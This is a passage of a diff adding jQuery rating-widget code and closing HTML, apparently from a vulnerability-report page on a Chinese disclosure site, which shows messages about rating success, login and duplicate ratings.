+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
